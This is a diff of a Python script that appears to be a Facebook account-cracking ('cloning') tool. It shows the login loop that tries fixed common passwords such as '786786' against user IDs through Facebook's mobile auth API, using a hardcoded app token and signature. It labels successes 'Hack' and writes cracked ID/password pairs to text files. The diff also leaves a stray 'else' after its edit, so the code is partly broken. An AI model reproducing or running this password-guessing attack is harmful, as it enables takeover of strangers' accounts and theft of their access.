@@ -259,22 +259,21 @@ def action():
         except OSError:
             pass
         try:
-            pass1 = "445566"
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;93m(Hack)  ' + k + c + user + '  |  ' + pass1                                       
-                okb = open('save/cloned.txt', 'a')
-                okb.write(k+c+user+pass1+'\n')
-                okb.close()
-                oks.append(c+user+pass1)
-            else:
-                if 'www.facebook.com' in q['error_msg']:
-                    print '\033[1;97m(hack) ' + k + c + user + '  |  ' + pass1
-                    cps = open('save/cloned.txt', 'a')
-                    cps.write(k+c+user+pass1+'\n')
-                    cps.close()
-                    cpb.append(c+user+pass1)
+            pass1 = '786786'
+            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
+            d = json.loads(q)
+            if 'www.facebook.com' in d['error_msg']:
+                print 'Error ' + uid + ' | ' + pass1 + ' --> CP'
+                cp = open('cp.txt', 'a')
+                cp.write(uid + ' | ' + pass1 + '\n')
+                cp.close()
+                cps.append(uid)
+            elif 'access_token' in d:
+                print '\x1b[1;92mHack \x1b[1;30m' + uid + ' | ' + pass1 + ' --> OK\x1b[1;0m'
+                ok = open('ok.txt', 'a')
+                ok.write(uid + ' | ' + pass1 + '\n')
+                ok.close()
+                oks.append(uid)
                 else:
                     pass2 = "234567"
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
